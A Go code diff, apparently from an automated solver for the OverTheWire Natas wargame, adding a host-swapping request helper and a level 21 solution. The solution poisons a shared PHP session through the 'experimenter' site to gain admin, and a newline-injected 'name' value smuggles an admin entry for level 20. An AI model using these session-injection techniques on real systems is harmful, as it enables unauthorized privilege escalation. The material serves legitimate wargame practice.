@@ -92,6 +92,19 @@ func (p Path) Grab(r http.Request) string {
 	return s
 }
 
+type Host struct {
+	Grabber
+	Host Grabber
+}
+
+func (h Host) Grab(r http.Request) string {
+	oldHost := r.URL.Host
+	r.URL.Host = h.Host.Grab(r)
+	s := h.Grabber.Grab(r)
+	r.URL.Host = oldHost
+	return s
+}
+
 type Headers struct {
 	Grabber
 	Headers SetData
@@ -621,14 +634,43 @@ var levels = [...]Grabber{
 						grab,
 						"natas21",
 					},
-					SetData{
-						"Cookie": Text{"PHPSESSID=1"},
-					},
+					SetData{"Cookie": Text{"PHPSESSID=1"}},
 				},
 				SetData{
 					"name": Text{"a\nadmin 1"},
 				},
 				nil,
+			},
+		},
+	},
+	//level 21
+	Headers{
+		Prefixed{
+			grab,
+			"Password: ",
+			32,
+		},
+		SetData{
+			"Cookie": Text{"PHPSESSID=1"},
+			"Upgrade-Insecure-Requests": Host{
+				Get{
+					Post{
+						Headers{
+							Contains{
+								grab,
+								"[admin]",
+							},
+							SetData{"Cookie": Text{"PHPSESSID=1"}},
+						},
+						SetData{
+							"admin":  Text{"1"},
+							"submit": Text{""},
+						},
+						nil,
+					},
+					SetData{"debug": Text{"1"}},
+				},
+				Text{"natas21-experimenter.natas.labs.overthewire.org"},
 			},
 		},
 	},
